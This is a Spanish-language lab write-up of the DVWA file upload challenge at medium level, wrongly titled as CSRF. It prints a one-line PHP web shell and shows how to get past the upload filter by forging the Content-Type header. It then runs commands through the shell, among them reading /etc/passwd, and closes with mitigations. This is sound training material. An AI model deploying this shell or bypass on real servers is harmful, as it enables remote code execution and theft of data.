# Falsificación de solicitud entre sitios (CSRF) - DVWA

### 1. Descripción de la Vulnerabilidad
La vulnerabilidad de subida de archivos (File Upload) ocurre cuando una aplicación permite a un usuario cargar archivos al servidor sin validar correctamente su contenido, extensión o tipo MIME. Esto puede permitir a un atacante subir scripts maliciosos (como una Web Shell) para ejecutar código de forma remota (RCE).


#### Desafío Nivel Medium
En este nivel, la aplicación implementa una restricción basada en el MIME type y el tamaño del archivo. El código fuente verifica que:
* El archivo sea una imagen (ej. `image/jpeg` o `image/png`).
* El tamaño no exceda un límite establecido.

### 2. Análisis del Entorno y Explotación
Práctica realizada en un entorno controlado con **Kali Linux** y **VirtualBox**.

#### Identificación de la debilidad
La validación se realiza únicamente en el lado del servidor revisando la cabecera Content-Type de la petición HTTP. Como esta cabecera es enviada por el cliente, puede ser interceptada y modificada antes de que llegue al servidor.

#### Validación del Ataque (Paso a Paso)
Para saltar esta restricción, hemos utilizado herramientas de interceptación (como **Burp Suite** o las herramientas de desarrollador del navegador):
* **Creación del Payload:** Se creó un archivo llamado shell.php con el siguiente contenido para ejecutar comandos:
`<?php echo shell_exec($_GET['cmd']); ?>`
* **Interceptación:** Al intentar subir shell.php, el servidor lo rechaza porque el Content-Type es application/x-php.
* **Manipulación:** Se intercepta la petición y se cambia manualmente el `Content-Type` a `image/jpeg`.
* **Ejecución:** El servidor acepta el archivo creyendo que es una imagen.

| Archivo Subido | Tipo Real   | Tipo MIME Falsificado | Resultado             |
|----------------|------------|----------------------|-----------------------|
| shell.php      | PHP Script | image/jpeg           | Éxito (Uploaded)      |

#### Extracción de Información Crítica
Una vez subida la shell, accedemos a la ruta del archivo y ejecutamos comandos mediante el parámetro `cmd`:
* **Lectura de usuarios:** `.../uploads/shell.php?cmd=cat /etc/passwd`
* **Ubicación:** `.../uploads/shell.php?cmd=pwd`

### 3. Mitigación y Buenas Prácticas (RA3)
Para corregir esta vulnerabilidad y asegurar una puesta en producción segura:
* **Renombrado de archivos:** Cambiar el nombre de los archivos subidos a un hash aleatorio y eliminar la extensión original.
* **Validación de contenido real:** No confiar en el MIME type; usar funciones que analicen el contenido real del archivo (ej. `getimagesize()` en PHP).
* **Deshabilitar ejecución:** Configurar el servidor web para que no ejecute scripts en la carpeta de `/uploads`.
* **Almacenamiento externo:** Guardar los archivos fuera del directorio raíz de la web o en un servicio de almacenamiento aislado.

